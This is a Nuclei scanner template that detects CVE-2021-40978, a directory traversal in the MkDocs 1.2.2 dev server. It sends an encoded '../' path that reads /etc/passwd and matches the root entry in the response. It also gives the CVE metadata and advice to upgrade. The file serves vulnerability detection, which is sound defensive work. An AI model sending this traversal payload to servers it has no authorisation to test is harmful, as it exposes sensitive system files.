http:
- matchers:
  - part: body
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
id: CVE-2021-40978
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:mkdocs:mkdocs:1.2.2:*:*:*:*:*:*:*
    cve-id: CVE-2021-40978
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.99297
    epss-score: 0.84812
  description: The MKdocs 1.2.2 built-in dev-server allows directory traversal using
    the port 8000, enabling remote exploitation to obtain sensitive information. Note
    the vendor has disputed the vulnerability (see references) because the dev server
    must be used in an unsafe way (namely public) to have this vulnerability exploited.
  impact: 'An attacker can read or modify sensitive files on the server, potentially
    leading to unauthorized access, data leakage, or system compromise.

    '
  metadata:
    max-request: 1
    product: mkdocs
    vendor: mkdocs
  name: MKdocs 1.2.2 - Directory Traversal
  reference:
  - https://github.com/mkdocs/mkdocs/pull/2604
  - https://github.com/nisdn/CVE-2021-40978
  - https://nvd.nist.gov/vuln/detail/CVE-2021-40978
  - https://github.com/mkdocs/mkdocs
  - https://github.com/mkdocs/mkdocs/issues/2601
  remediation: 'Upgrade MKdocs to version 1.2.3 or later to fix the directory traversal
    vulnerability.

    '
  severity: high
  tags: cve2021,cve,mkdocs,lfi,vuln
